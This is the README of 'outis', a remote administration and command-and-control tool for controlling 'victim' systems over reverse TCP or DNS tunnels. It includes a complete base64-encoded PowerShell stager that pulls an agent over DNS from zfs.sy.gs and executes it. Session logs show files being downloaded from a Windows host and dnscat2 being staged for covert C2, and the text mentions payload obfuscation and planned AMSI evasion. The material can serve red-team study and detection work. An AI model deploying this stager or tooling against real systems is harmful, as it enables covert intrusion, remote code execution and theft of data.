outis
=====

outis is a custom Remote Administration Tool (RAT) or something like that. Think Meterpreter or Empire-Agent. However, the focus of this tool is neither an exploit toolkit (there are no exploits) nor persistent management of targets. The focus is to communicate between server and target system and to transfer files, share sockets, spawn shells and so on using various methods and platforms.


On the Name
===========

The cyclops Polyphemus in Homer's Odyssey had some issues with name resolution. When he asked for Odysseus' name, the hacker told him it is "Outis" meaning "Nobody" in ancient Greek. Thus, when Polyphemus later shouted, that Nobody was about to kill him, strangly no help arrived.

My thanks to Marcel for remembering this marvelous piece of classic tale.


Dependencies for the Handler
============================

Archlinux users can install the following packages:

 * python3 # includes cmd, tempfile, ...
 * python-progressbar2
 * python-dnspython
 * python-crypto
 * python-pyopenssl
 * and maybe more...

In other distributions the names may differ, for instance, there is a module named crypto and a module named pycrypto. We need the latter.

Also, older versions might cause problems:

 * pyopenssl needs to be version 16.1.0 or newer, check as follows:
 ```
    $ python3 -c 'import OpenSSL; print(OpenSSL.version.__version__)'
 ```

You can set up a python virtual environment quite easily:

```
$ virtualenv outis-venv
$ source ./outis-venv/bin/activate
(outis-venv) $ pip install progressbar2 dnspython pycrypto pyopenssl
```

This results to the following package list, which seems to work for me:

```
$ pip freeze
appdirs==1.4.3
asn1crypto==0.22.0
cffi==1.10.0
cryptography==1.8.1
dnspython==1.15.0
idna==2.5
packaging==16.8
progressbar2==3.18.1
pycparser==2.17
pycrypto==2.6.1
pyOpenSSL==16.2.0
pyparsing==2.2.0
python-utils==2.1.0
six==1.10.0
```


Installation
============

Clone this git with recursive flag to also clone its submodules in the thirdpartytools folder:

```
git clone --recursive ...
```

The handler runs on Python 3. Install its dependencies and run it. It will generate stagers, agents and everything else for you.

To bind low ports without needing root privileges, consider using a capability wrapper.


Terms
=====

 * **agent**: software, that runs on the victim system
 * **handler**: software, that parses your commands and leads the agents (usually it runs on your server)
 * **stager**: short script that downloads the agent (using the transport module) and runs it
 * **transport**: communication channel between stager/agent and handler, e.g. ReverseTCP
 * **platform**: victim architecture to use for stager/agent scripts, e.g. PowerShell


Currently Supported Plattforms
==============================

 * PowerShell (partial)


Currently Supported Transports
==============================

 * Reverse TCP
 * DNS (types TXT or A for staging, and types TXT, CNAME, MX, AAAA or A for agent connection)


Currently Supported Cryptography
================================

 * Agent stages can be encoded (for obfuscation, not for security) using cyclic XOR
 * Agent stages can be authenticated using RSA signatures and pinned certificates
 * Transport connections can be encrypted / authenticated using TLS and pinned certificates


Currently Supported Commands and Controls
=========================================

 * ping requests to test the connection (partial)
 * text message format (partial)
 * upload and download of files


Currently Supported Extras
==========================

 * When using DNS transport with stager and powershell, you can stage the tool dnscat2 / dnscat2-powershell from the thirdpartytools directory instead of the default outis agent. Set the platform option AGENTTYPE to DNSCAT2 (will take a while, but uses only DNS to stage) or DNSCAT2DOWNLOADER (tries to download using HTTPS).


Usage Examples
==============

Download of a file using staged DNS transport with POWERSHELL platform could look like this:

```raw
$ outis
outis> set TRANSPORT DNS
outis> set ZONE zfs.sy.gs
outis> set AGENTDEBUG TRUE
outis> info
[+] Options for the Handler:
Name               Value       Required  Description                                                      
-----------------  ----------  --------  -----------------------------------------------------------------
TRANSPORT          DNS         True      Communication way between agent and handler (Options: REVERSETCP,
                                          DNS)
CHANNELENCRYPTION  TLS         True      Encryption Protocol in the transport (Options: NONE, TLS)
PLATFORM           POWERSHELL  True      Platform of agent code (Options: POWERSHELL)
PROGRESSBAR        TRUE        True      Display a progressbar for uploading / downloading? (only if not 
                                         debugging the relevant module) (Options: TRUE, FALSE)

[+] Options for the TRANSPORT module DNS:
Name       Value        Required  Description                                                             
---------  -----------  --------  ------------------------------------------------------------------------
ZONE       zfs.sy.gs    True      DNS Zone for handling requests
LHOST      0.0.0.0      True      Interface IP to listen on
LPORT      53           True      UDP-Port to listen on for DNS server
DNSTYPE    TXT          True      DNS type to use for the connection (stager only, the agent will 
                                  enumerate all supported types on its own) (Options: TXT, A)
DNSSERVER               False     IP address of DNS server to connect for all queries

[+] Options for the PLATFORM module POWERSHELL:
Name                  Value                       Required  Description                                   
--------------------  --------------------------  --------  ----------------------------------------------
STAGED                TRUE                        True      Is the communication setup staged or not? 
                                                            (Options: TRUE, FALSE)
STAGEENCODING         TRUE                        True      Should we send the staged agent in an encoded 
                                                            form (obscurity, not for security!) (Options: 
                                                            TRUE, FALSE)
STAGEAUTHENTICATION   TRUE                        True      Should the stager verify the agent code 
                                                            before executing (RSA signature verification 
                                                            with certificate pinning) (Options: TRUE, 
                                                            FALSE)
STAGECERTIFICATEFILE  $TOOLPATH/data/outis.pem    False     File path of a PEM with both RSA key and 
                                                            certificate to sign and verify staged agent 
                                                            with (you can generate a selfsigned cert by 
                                                            using the script gencert.sh initially)
AGENTTYPE             DEFAULT                     True      Defines which agent should be used (the 
                                                            default outis agent for this plattform, or 
                                                            some third party software we support) 
                                                            (Options: DEFAULT, DNSCAT2, DNSCAT2DOWNLOADER)
TIMEOUT               9                           True      Number of seconds to wait for each request 
                                                            (currently only supported by DNS stagers)
RETRIES               2                           True      Retry each request for this number of times 
                                                            (currently only supported by DNS stagers)
AGENTDEBUG            TRUE                        True      Should the agent print and log debug messages 
                                                            (Options: TRUE, FALSE)
outis> generatestager
[+] Use the following stager code:
powershell.exe -Enc JAByAD0ARwBlAHQALQBSAGEAbgBkAG8AbQA7ACQAYQA9ACIAIgA7ACQAdAA9ADAAOwBmAG8AcgAoACQAaQA9ADAAOwA7
  ACQAaQArACsAKQB7ACQAYwA9ACgAWwBzAHQAcgBpAG4AZwBdACgASQBFAFgAIAAiAG4AcwBsAG8AbwBrAHUAcAAgAC0AdAB5AHAAZQA9AFQAWA
  BUACAALQB0AGkAbQBlAG8AdQB0AD0AOQAgAHMAJAAoACQAaQApAHIAJAAoACQAcgApAC4AegBmAHMALgBzAHkALgBnAHMALgAgACIAKQApAC4A
  UwBwAGwAaQB0ACgAJwAiACcAKQBbADEAXQA7AGkAZgAoACEAJABjACkAewBpAGYAKAAkAHQAKwArAC0AbAB0ADIAKQB7ACQAaQAtAC0AOwBjAG
  8AbgB0AGkAbgB1AGUAOwB9AGIAcgBlAGEAawA7AH0AJAB0AD0AMAA7ACQAYQArAD0AJABjADsAfQAkAGEAPQBbAEMAbwBuAHYAZQByAHQAXQA6
  ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAYQApADsAJABiAD0AJABhAC4ATABlAG4AZwB0AGgAOwAkAGYAcAA9ACIAWA
  B4AEkAMgArAGUAQgBoAGUAUgBMAFMATQBuAHIAVQBNAFgAbgBnAHIARABTAGQATwAyAGQAOAAwAGMAZAB2AHcAcwBKAGMAYwBGAEIAbgAvAGYA
  LwB3AEoATwBpAEIAVAA4AGIATwA2AHAAZgBXAFgAdwBwAEUATwBQAFAAUgBsAFAAdgBnAE8AbgBlAGcAYwBpAE8AYgBPAGEAZABOAFAAVQBxAH
  AAZgBRAD0APQAiADsAJABpAD0AMAA7ACQAYQA9ACQAYQB8ACUAewAkAF8ALQBiAFgAbwByACQAZgBwAFsAJABpACsAKwAlACQAZgBwAC4ATABl
  AG4AZwB0AGgAXQB9ADsAJABwAGsAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB0AHIAaQBuAGcAKAAkAGEALAAwACwANwA1ADUAKQA7ACQAcw
  BpAGcAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB0AHIAaQBuAGcAKAAkAGEALAA3ADUANQAsADYAOAA0ACkAOwAkAHMAPQBOAGUAdwAtAE8A
  YgBqAGUAYwB0ACAAUwB0AHIAaQBuAGcAKAAkAGEALAAxADQAMwA5ACwAKAAkAGIALQAxADQAMwA5ACkAKQA7ACQAcwBoAGEAPQBOAGUAdwAtAE
  8AYgBqAGUAYwB0ACAAUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBTAEgAQQA1ADEAMgBNAGEAbgBhAGcAZQBk
  ADsAaQBmACgAQAAoAEMAbwBtAHAAYQByAGUALQBPAGIAagBlAGMAdAAgACQAcwBoAGEALgBDAG8AbQBwAHUAdABlAEgAYQBzAGgAKAAkAHAAaw
  AuAFQAbwBDAGgAYQByAEEAcgByAGEAeQAoACkAKQAgACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIA
  aQBuAGcAKAAkAGYAcAApACkAIAAtAFMAeQBuAGMAVwBpAG4AZABvAHcAIAAwACkALgBMAGUAbgBnAHQAaAAgAC0AbgBlACAAMAApAHsAIgBFAF
  IAUgBPAFIAMQAiADsARQB4AGkAdAAoADEAKQB9ADsAJAB4AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5
  AHAAdABvAGcAcgBhAHAAaAB5AC4AUgBTAEEAQwByAHkAcAB0AG8AUwBlAHIAdgBpAGMAZQBQAHIAbwB2AGkAZABlAHIAOwAkAHgALgBGAHIAbw
  BtAFgAbQBsAFMAdAByAGkAbgBnACgAJABwAGsAKQA7AGkAZgAoAC0ATgBvAHQAIAAkAHgALgBWAGUAcgBpAGYAeQBEAGEAdABhACgAJABzAC4A
  VABvAEMAaABhAHIAQQByAHIAYQB5ACgAKQAsACIAUwBIAEEANQAxADIAIgAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAG
  UANgA0AFMAdAByAGkAbgBnACgAJABzAGkAZwApACkAKQB7ACIARQBSAFIATwBSADIAIgA7AEUAeABpAHQAKAAyACkAfQA7ACIARwBPAEEARwBF
  AE4AVAAiADsASQBFAFgAIAAkAHMAOwA=
outis> run
[+] DNS listening on 0.0.0.0:53
[+] Sending staged agent (34332 bytes)...
100% (184 of 184) |########################################################| Elapsed Time: 0:00:16 Time: 0:00:16
[+] Staging done
[+] Waiting for connection and TLS handshake...
[+] Initial connection with new agent started
[+] Upgrade to TLS done
outis session> [+] AGENT: Hello from Agent

outis session> download C:\testfile.txt /tmp/out.txt
[+] initiating download of remote file C:\testfile.txt to local file /tmp/out.txt
[+] agent reports a size of 3295 bytes for channel 1
100% (3295 of 3295) |######################################################| Elapsed Time: 0:00:00 Time: 0:00:00
[+] wrote 3295 bytes to file /tmp/out.txt
outis session> exit
Do you really want to exit the session and close the connection [y/N]? y
outis> exit
```

Or maybe we want to use dnscat2 for the real deal and just use outis to stage it:

```raw
$ outis
outis> set TRANSPORT DNS
outis> set AGENTTYPE DNSCAT2
outis> set ZONE zfs.sy.gs
outis> run
[+] DNS listening on 0.0.0.0:53
[+] Sending staged agent (406569 bytes)...
100% (2185 of 2185) |#######################################################| Elapsed Time: 0:01:17 Time: 0:01:17
[+] Staging done
[+] Starting dnscat2 to handle the real connection

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted and authenticated
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = zfs.sy.gs]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=muzynL9ofNW+vymbGMLmi1W1QOT7jEJNYcCRZ1wy5fzTf1Y3epy1RuO7BcHJcIsBvGsZW9NvmQBUSVmUXMCaTg== zfs.sy.gs

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=muzynL9ofNW+vymbGMLmi1W1QOT7jEJNYcCRZ1wy5fzTf1Y3epy1RuO7BcHJcIsBvGsZW9NvmQBUSVmUXMCaTg==

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2> New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2> sessions
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = zfs.sy.gs [*]
  1 :: command (feynman-win7) [encrypted and verified] [*]
  
dnscat2> session -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command (feynman-win7) 1> download c:/testfile.txt /tmp/out.txt
Attempting to download c:/testfile.txt to /tmp/out.txt
Wrote 3295 bytes from c:/testfile.txt to /tmp/out.txt!

command (feynman-win7) 1> exit
Input thread is over
```

Inspirations
============

This project was inspired by (and shamelessly stole part of its code from):

 * Empire:
   * https://github.com/adaptivethreat/Empire/blob/master/lib/common/stagers.py
     — generate_launcher uses a HTTP(S) stager
   * https://github.com/adaptivethreat/Empire/tree/master/data/agent
     — stager (step two after initial launcher) and agent (step three)
   * https://github.com/EmpireProject/Empire/blob/master/lib/common/helpers.py
     — powershell script generation and stipping

 * Metasploit:
   * https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmdstager.rb
     — CmdStager for bourne, ...

 * ReflectiveDLLInjection:
   * https://github.com/stephenfewer/ReflectiveDLLInjection
 
 * p0wnedShell:
   * https://github.com/Cn33liz/p0wnedShell
     — some ideas for AMSI evation for future use
 
 * dnscat2:
   * https://github.com/iagox86/dnscat2/blob/master/doc/protocol.md
     — ideas on protocol design over DNS
   * https://github.com/lukebaggett/dnscat2-powershell/blob/master/dnscat2.ps1
     — powershell version of the dnscat2 agent
  
 * dnsftp
   * https://github.com/breenmachine/dnsftp
     — short script parts for stagers via DNS

Disclaimer
==========

Use at your own risk. Do not use without full consent of everyone involved.
For educational purposes only.
